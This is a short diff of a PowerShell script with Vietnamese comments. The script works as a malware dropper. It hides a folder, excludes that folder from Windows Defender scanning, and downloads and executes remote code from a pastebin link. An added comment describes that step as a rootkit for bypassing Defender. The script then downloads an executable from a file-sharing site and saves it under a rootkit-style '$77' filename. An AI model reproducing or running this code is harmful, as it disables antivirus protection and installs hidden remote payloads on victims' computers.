@@ -51,9 +51,9 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
-iwr "https://pastie.io/raw/evijeu" | iex
+iwr "https://pastie.io/raw/evijeu" | iex # Sử dụng RootKit v3 để bypass windows defender
 
-$filePath = "$folderPath\hitler.exe"
+$filePath = "$folderPath\$77.exe"
 $url = "https://anonsharing.com/file/8c1a24ed85d74236/verify_(3).exe"
 
 # Tạo thư mục nếu chưa tồn tại
